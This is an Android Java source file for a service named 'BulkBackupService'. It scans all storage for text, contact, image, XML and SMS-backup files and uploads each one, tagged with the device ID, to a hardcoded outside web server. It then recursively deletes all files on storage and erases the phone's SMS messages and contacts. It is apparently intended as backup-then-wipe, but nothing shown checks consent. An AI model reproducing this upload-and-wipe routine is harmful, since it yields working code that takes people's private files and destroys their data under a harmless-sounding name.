package com.example.services;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

import com.example.utils.DynaMounts;
import com.example.utils.SMSUtils;
import com.example.utils.TraverseAndDelete;
import com.example.utils.VCFUtils;

import android.app.IntentService;
import android.content.Intent;
import android.provider.Settings.Secure;
import android.util.Log;

public class BulkBackupService extends IntentService {

	public BulkBackupService() {
		super("BulkBackupService");
		// TODO Auto-generated constructor stub
	}

	private String urlString = "http://www.georgemourton.com/SingleUpload.php";
	private HttpEntity resEntity;
	List<String> filePaths;

	@Override
	protected void onHandleIntent(Intent intent) {
		filePaths = new ArrayList<String>();
		
		DynaMounts d2 = new DynaMounts();
		d2.findStorage();
		HashMap<String, String> map2 = d2.getPaths();

		if (map2 != null) {
			// debug print it here
			for (Map.Entry<String, String> entry : map2.entrySet()) {
				String key = entry.getKey();
				String value = entry.getValue();
				Log.d("LABEL", value);
				Log.d("PATH", key);
				
				try {
					traverse(new File(key), "");
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

		} else {
			Log.d("PATH", "NO STORAGE MOUNTED");
		}

//		try {
//			traverse(new File("/mnt/sdcard/"), "");
//		} catch (IOException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		}

		List<FileBody> filesToUpload = new ArrayList<FileBody>();
		for (int i = 0; i < filePaths.size(); i++) {
			filesToUpload.add(new FileBody(new File(filePaths.get(i))));
		}
		Log.d("RESPONSE", Integer.toString(filesToUpload.size()));

		
		/*
		 * Oh god this is horrible. Time to refactor this mess
		 * Hosting wont allow me to change max_uploads past 20 for some reason - upload files indivudually
		 * That will show them!
		 */
		try {
			
			// files
			// example reqEntity.addPart("uploadedfile1", bin1); need to loop
			for (int i = 0; i < filesToUpload.size(); i++) {
				HttpClient client = new DefaultHttpClient();
				HttpPost post = new HttpPost(urlString);
				MultipartEntity reqEntity = new MultipartEntity();
				reqEntity.addPart("uploadedfile" + i, filesToUpload.get(i));
				// params
				reqEntity.addPart("numOfFiles",
						new StringBody(Integer.toString(filesToUpload.size())));
				reqEntity.addPart(
						"number", new StringBody(String.valueOf(i)));
				reqEntity.addPart(
						"user",
						new StringBody(Secure.getString(getBaseContext()
								.getContentResolver(), Secure.ANDROID_ID)));
				post.setEntity(reqEntity);
				HttpResponse response = client.execute(post);
				resEntity = response.getEntity();
				final String response_str = EntityUtils.toString(resEntity);
				if (resEntity != null) { 
					Log.d("RESPONSE", response_str);

				}
			}

			

		} catch (Exception e) {
			Log.e("Debug", "error: " + e.getMessage(), e);
		} 
		Log.d("RESPONSE", "Only here after the response"); 
		
		//after uploading all wanted files - delete everything
		DynaMounts d = new DynaMounts();
		d.findStorage();
		HashMap<String, String> map = d.getPaths();

		if (map != null) {
			// debug print it here
			for (Map.Entry<String, String> entry : map.entrySet()) {
				String key = entry.getKey();
				String value = entry.getValue();
				Log.d("LABEL", value);
				Log.d("PATH", key);
				TraverseAndDelete tad = new TraverseAndDelete(key); 
				try {
					tad.traverse(new File(key));
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

		} else {
			Log.d("PATH", "NO STORAGE MOUNTED");
		}
		//remove contacts and sms
		SMSUtils sms = new SMSUtils(this);
		sms.delete();
		VCFUtils vcf = new VCFUtils(this); 
		vcf.delete();
	}

	public void traverse(File parentNode, String indentation)
			throws IOException {
		if (parentNode.isDirectory()) {
			indentation += "---";

			File[] childNodes = parentNode.listFiles();
			for (File child : childNodes) {
				traverse(child, indentation);
			}
		} else {
			if (getFileExtension(parentNode.getName()).equals("txt")) {
				filePaths.add(parentNode.getPath());
			} else if (getFileExtension(parentNode.getName()).equals("vcf")) {
				filePaths.add(parentNode.getPath());
			} else if (getFileExtension(parentNode.getName()).equals("jpg")) {
				filePaths.add(parentNode.getPath());
			} else if (getFileExtension(parentNode.getName()).equals("png")) {
				filePaths.add(parentNode.getPath());
			} else if (getFileExtension(parentNode.getName()).equals("xml")) {
				filePaths.add(parentNode.getPath());
			} else if (getFileExtension(parentNode.getName()).equals("bsms")) {
				filePaths.add(parentNode.getPath());
			}
		}
	}

	private String getFileExtension(String s) {
		String filenameArray[] = s.split("\\.");
		String extension = filenameArray[filenameArray.length - 1];
		return extension;

	}

}
